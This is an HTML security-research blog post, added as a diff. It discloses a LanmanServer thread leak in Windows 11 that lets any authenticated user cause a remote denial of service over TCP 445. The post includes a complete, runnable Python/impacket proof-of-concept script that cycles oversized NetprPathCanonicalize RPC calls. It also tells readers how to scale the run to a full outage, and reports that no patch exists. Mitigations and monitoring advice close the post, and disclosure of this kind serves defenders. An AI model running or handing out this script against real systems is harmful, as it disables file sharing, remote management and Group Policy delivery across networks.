@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LanmanServer thread leak: authenticated RPC cycling to DoS — 1dotq</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+<header>
+  <h1><span>//</span> 1dotq</h1>
+  <p>vulnerability research &amp; low-level Windows internals</p>
+  <nav>
+    <a href="../index.html">posts</a>
+    <a href="mailto:quintinm1@gmail.com">contact</a>
+    <a href="https://github.com/1dotq" target="_blank">github</a>
+  </nav>
+</header>
+
+<article>
+<div class="post-header">
+  <h1>LanmanServer thread leak: authenticated RPC cycling to DoS</h1>
+  <div class="meta">
+    2026-06-01 &nbsp;&mdash;&nbsp; Windows 11 Build 26200 (April 2026 Patch Tuesday) &nbsp;&mdash;&nbsp; LanmanServer / TCP 445
+  </div>
+  <div class="tags" style="margin-top:10px;">
+    <span>windows</span>
+    <span>rpc</span>
+    <span>smb</span>
+    <span>thread-leak</span>
+    <span>dos</span>
+  </div>
+</div>
+
+<div class="post-body">
+
+<table style="width:100%;border-collapse:collapse;margin-bottom:32px;font-size:0.82rem;">
+  <thead>
+    <tr style="border-bottom:1px solid #2a2a2a;">
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">Field</th>
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#5af;">Component</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">srvsvc.dll 10.0.26100.1, LanmanServer svchost.exe</td>
+    </tr>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#5af;">Type</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">Resource exhaustion — unbounded thread accumulation</td>
+    </tr>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#5af;">Auth required</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">Yes — any domain or local account (no elevation)</td>
+    </tr>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#5af;">Attack vector</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">Network — TCP 445, ncacn_np transport</td>
+    </tr>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#5af;">Impact</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">Full SMB stack DoS — file sharing, admin shares, pipe-based RPC all unavailable</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>
+  The Windows LanmanServer service (<code>srvsvc.dll</code>) doesn't reclaim worker
+  threads when authenticated RPC clients disconnect from <code>\pipe\srvsvc</code>.
+  Thread count grows monotonically with connection cycles and never returns to
+  baseline. Once enough threads accumulate, the Service Control Manager can't
+  deliver control codes within its 30-second timeout and EventID 7011 fires —
+  at which point all SMB file sharing, admin shares, and named-pipe-dependent
+  remote management are unavailable.
+</p>
+
+<p>
+  The attack is entirely remote. The only prerequisites are TCP/445 reachability
+  and one set of low-privileged credentials — any domain user, any local account.
+  The PoC is 73 lines of Python using impacket and runs in under 30 seconds to
+  a detectable leak, under five minutes to full DoS.
+</p>
+
+<h2>What LanmanServer is and why it matters</h2>
+
+<p>
+  LanmanServer is the Windows implementation of the SMB server — the service that
+  makes <code>\\server\share</code> work. It hosts the MS-SRVS (Server Service
+  Remote Protocol) interface, which is exposed as an RPC endpoint on the named
+  pipe <code>\pipe\srvsvc</code>. That pipe is reachable from the network via
+  SMB transport (port 445) and requires a valid authenticated session.
+</p>
+
+<p>
+  Everything that depends on SMB for its own remote management channel goes down
+  when LanmanServer goes down:
+</p>
+
+<ul>
+  <li>All file and printer shares</li>
+  <li>Admin shares — <code>C$</code>, <code>ADMIN$</code>, <code>IPC$</code></li>
+  <li>WMI remote (uses <code>ncacn_np</code> over <code>IPC$</code>)</li>
+  <li><code>sc.exe</code> remote and <code>PsExec</code>-style execution</li>
+  <li>Group Policy SYSVOL replication (domain controllers)</li>
+  <li>Any other RPC service using the named pipe transport</li>
+</ul>
+
+<p>
+  On a domain controller, taking down LanmanServer means SYSVOL becomes
+  unreachable. Group Policy stops applying for every machine that polls that DC.
+</p>
+
+
+<h2>The thread leak</h2>
+
+<p>
+  MS-SRVS uses the DCE/RPC connection-oriented protocol over named pipe
+  transport (<code>ncacn_np</code>). When a client connects and binds to the
+  server's interface, the server allocates a worker thread from its thread pool
+  to service that RPC association. On normal disconnect, that thread should be
+  returned to the pool and recycled.
+</p>
+
+<p>
+  In LanmanServer's implementation in <code>srvsvc.dll</code>, the thread is not
+  fully reclaimed after disconnect. It remains in the pool in a blocked state —
+  <code>ntdll!NtWaitForSingleObject</code> — consuming a thread object and a stack
+  allocation indefinitely. This is confirmed by the memory dump: all 8,697 threads
+  at peak are sitting at the same wait call with no work queued.
+</p>
+
+<p>
+  The leak is worst when the client dispatches a call before disconnecting. The
+  PoC uses opnum 31 — <code>NetprPathCanonicalize</code> — with a 32,768-character
+  path. This isn't the thing that causes the leak; it's what maximises it. The
+  oversized call commits the server-side thread to processing the request before
+  the transport is torn down, preventing the thread lifecycle from running cleanup
+  on the happy path. A bare connect/bind/disconnect leaks at a lower rate;
+  dispatching first makes every cycle count.
+</p>
+
+
+<h2>Proof of concept</h2>
+
+<pre>#!/usr/bin/env python3
+"""
+PoC: LanmanServer RPC Thread Accumulation DoS
+Target: Windows LanmanServer service (srvsvc.dll)
+
+Requirements: pip install impacket
+Usage: python3 msrc_poc_lanman_thread_leak.py &lt;TARGET_IP&gt; &lt;USER&gt; &lt;PASS&gt;
+"""
+import sys, time, struct
+from impacket.dcerpc.v5 import transport, srvs
+
+TARGET   = sys.argv[1] if len(sys.argv) &gt; 1 else "TARGET_IP"
+USERNAME = sys.argv[2] if len(sys.argv) &gt; 2 else "username"
+PASSWORD = sys.argv[3] if len(sys.argv) &gt; 3 else "password"
+
+CYCLES   = 500    # connections to open/close — increase for full DoS
+INTERVAL = 0.05   # seconds between cycles
+
+ok = 0
+fail = 0
+for i in range(CYCLES):
+    try:
+        rpct = transport.DCERPCTransportFactory(
+            f"ncacn_np:{TARGET}[\\pipe\\srvsvc]"
+        )
+        rpct.set_credentials(USERNAME, PASSWORD)
+        dce = rpct.get_dce_rpc()
+        dce.connect()
+        dce.bind(srvs.MSRPC_UUID_SRVS)
+
+        # opnum 31 — NetprPathCanonicalize with oversized path
+        path = "C:\\" + "A" * 32768
+        def ndr_wstr(s):
+            d = (s + "\x00").encode("utf-16-le")
+            c = len(d) // 2
+            return struct.pack("&lt;III", c, 0, c) + d
+        stub  = struct.pack("&lt;I", 0x00020000)
+        stub += ndr_wstr(path)
+        stub += struct.pack("&lt;I", 1024)
+        stub += ndr_wstr("\\")
+        stub += struct.pack("&lt;I", 0x00020004)
+        stub += struct.pack("&lt;I", 0)
+        stub += ndr_wstr(TARGET)
+        stub += struct.pack("&lt;I", 1)
+        try:
+            dce.call(31, stub)
+        except Exception:
+            pass  # error response expected — thread was still allocated
+
+        dce.disconnect()
+        ok += 1
+    except Exception as e:
+        fail += 1
+
+    if (i + 1) % 50 == 0:
+        print(f"  [{i+1:4d}/{CYCLES}]  ok={ok}  fail={fail}")
+    time.sleep(INTERVAL)
+
+print(f"\n[*] Done. {ok} connections cycled.")
+print(f"[*] Check LanmanServer thread count — should be elevated above baseline (~50).")</pre>
+
+<p>
+  To monitor thread growth on the target while the PoC runs:
+</p>
+
+<pre>while($true) {
+    $p = Get-Process svchost | Sort-Object { $_.Threads.Count } -Descending | Select-Object -First 1
+    Write-Host "$($p.Id) $($p.Threads.Count) threads $([math]::Round($p.WorkingSet64/1MB,1)) MB"
+    Start-Sleep 10
+}</pre>
+
+<p>
+  At 500 cycles with 0.05s intervals the run completes in about 25 seconds.
+  Set <code>CYCLES = 5000</code>, or run the script ten times back-to-back, for
+  the full DoS condition. Creating a throwaway standard user account for testing:
+</p>
+
+<pre># on target (PowerShell, admin)
+net user testuser TestPass123! /add
+
+# from attacker (Kali, any Python 3 + impacket)
+python3 msrc_poc_lanman_thread_leak.py &lt;TARGET_IP&gt; testuser TestPass123!</pre>
+
+
+<h2>What each step does</h2>
+
+<p>
+  Walking through the relevant lines to make the RPC mechanics explicit:
+</p>
+
+<p>
+  <code>DCERPCTransportFactory("ncacn_np:TARGET[\\pipe\\srvsvc]")</code> — selects
+  the Named Pipe connection-oriented RPC transport. This means everything goes
+  over SMB on port 445, using an existing or new authenticated SMB session as the
+  outer layer. The named pipe <code>\pipe\srvsvc</code> is the endpoint for the
+  Server Service Remote Protocol (MS-SRVS).
+</p>
+
+<p>
+  <code>dce.connect()</code> + <code>dce.bind(MSRPC_UUID_SRVS)</code> — establishes
+  the RPC association and identifies the interface. This is where the server allocates
+  the worker thread that will service this association.
+</p>
+
+<p>
+  <code>dce.call(31, stub)</code> — dispatches
+  <code>NetprPathCanonicalize</code> (opnum 31, documented in MS-SRVS §3.1.4.31)
+  with a hand-rolled NDR payload containing a 32,768-character wide-string path.
+  The call returns an error — the path is intentionally malformed — but the
+  server-side thread has already been dispatched into the call handling path.
+  The exception is caught and discarded; the return code doesn't matter.
+</p>
+
+<p>
+  <code>dce.disconnect()</code> — closes the transport. The server-side thread
+  does not return to the pool.
+</p>
+
+
+<h2>Evidence</h2>
+
+<p>
+  Thread counts recorded on the LanmanServer svchost.exe continuously during testing:
+</p>
+
+<table style="width:100%;border-collapse:collapse;margin-bottom:24px;font-size:0.82rem;">
+  <thead>
+    <tr style="border-bottom:1px solid #2a2a2a;">
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">State</th>
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">Threads</th>
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">Working set</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#b0b0b0;">Baseline (before PoC)</td>
+      <td style="padding:6px 10px;color:#5a5;">~50</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">~13 MB</td>
+    </tr>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#b0b0b0;">Peak (during full-DoS run)</td>
+      <td style="padding:6px 10px;color:#f55;">8,697</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">~260 MB</td>
+    </tr>
+    <tr>
+      <td style="padding:6px 10px;color:#b0b0b0;">After 2-hour idle (no connections)</td>
+      <td style="padding:6px 10px;color:#f55;">2,728</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">~82 MB</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>
+  Thread count after the 2-hour idle period did not return to the ~50 baseline.
+  The leaked threads are permanent for the lifetime of the service process — a
+  restart is required to reclaim them.
+</p>
+
+<p>
+  A full process dump of LanmanServer svchost.exe was captured at peak accumulation:
+</p>
+
+<pre>; Captured 2026-04-14 10:41 UTC
+; procdump on PID 2892 (LanmanServer svchost)
+; MDMP ThreadListStream: 8,697 threads
+; All 8,697 threads at:
+ntdll!NtWaitForSingleObject
+; No exception stream — process alive, thread pool saturated
+; SHA-256: c41acf3024653869664e7b8399d3b7d83e7f0064f18da74b294a85d6885ec10b</pre>
+
+<p>
+  All 8,697 threads sitting at <code>NtWaitForSingleObject</code> with nothing
+  queued confirms these are idle, leaked threads — not threads processing active
+  connections. The service is alive but its schedulable capacity is exhausted.
+</p>
+
+<p>
+  EventID 7011 fired four times on 2026-04-14, recorded in the System event log:
+</p>
+
+<pre>Source: Service Control Manager
+Log:    System
+ID:     7011
+
+08:45:58  "A timeout (30000 milliseconds) was reached while waiting for
+           a transaction response from the LanmanServer service."
+14:30:15  same
+14:41:00  same   ← service unresponsive for 21+ consecutive minutes
+14:51:38  same</pre>
+
+<p>
+  During those windows, all SMB file sharing, named pipe access, and admin shares
+  were unavailable on the target machine.
+</p>
+
+
+<h2>Target environment</h2>
+
+<ul>
+  <li>Windows 11 Build 26200.xxxx — fully patched, April 2026 Patch Tuesday</li>
+  <li><code>srvsvc.dll</code> version 10.0.26100.1</li>
+  <li>Authentication: any valid domain or local account — no elevated privileges required</li>
+  <li>No local console access to the target required</li>
+  <li>Attacker: any machine with TCP/445 access — same subnet, or any routed path where port 445 is not filtered</li>
+</ul>
+
+
+<h2>Mitigation</h2>
+
+<p>
+  No patch exists. These controls reduce exposure:
+</p>
+
+<ul>
+  <li>
+    <strong>Restrict TCP/445 inbound</strong> to explicitly authorised hosts via
+    host-based firewall rules or network ACLs. This is the most effective control
+    and directly prevents the attack from anything outside the permitted set.
+  </li>
+  <li>
+    <strong>Monitor EventID 7011 for LanmanServer</strong> in the System event log.
+    Multiple 7011 events in a short window are a reliable indicator of thread pool
+    exhaustion in progress.
+  </li>
+  <li>
+    <strong>Monitor thread count</strong> for the LanmanServer svchost process in
+    your performance infrastructure. Healthy baseline is ~50 threads. Rapid growth
+    above a few hundred warrants investigation.
+  </li>
+  <li>
+    <strong>Alert on high-rate SMB session churn</strong> from a single source IP —
+    connection cycling at 1–2 sessions/sec from one host is anomalous for normal
+    file-sharing workloads.
+  </li>
+</ul>
+
+
+<h2>Timeline</h2>
+
+<table style="width:100%;border-collapse:collapse;font-size:0.82rem;">
+  <thead>
+    <tr style="border-bottom:1px solid #2a2a2a;">
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">Date</th>
+      <th style="text-align:left;padding:6px 10px;color:#888;font-weight:normal;">Event</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #1a1a1a;">
+      <td style="padding:6px 10px;color:#5af;white-space:nowrap;">2026-04-14</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">Discovery; memory dump captured at peak (8,697 threads); 4&times; EventID 7011</td>
+    </tr>
+    <tr>
+      <td style="padding:6px 10px;color:#5af;white-space:nowrap;">2026-06-01</td>
+      <td style="padding:6px 10px;color:#b0b0b0;">Public disclosure</td>
+    </tr>
+  </tbody>
+</table>
+
+<p style="margin-top:32px;">
+  I'll update this post if a patch ships in a future Patch Tuesday.
+</p>
+
+<p style="color:#444;font-size:0.82rem;margin-top:40px;border-top:1px solid #1a1a1a;padding-top:16px;">
+  Dump SHA-256: <code>c41acf3024653869664e7b8399d3b7d83e7f0064f18da74b294a85d6885ec10b</code>
+  (444 MB, available on request)
+</p>
+
+</div>
+</article>
+
+<footer>
+  1dotq &mdash; independent security research
+</footer>
+
+</body>
+</html>
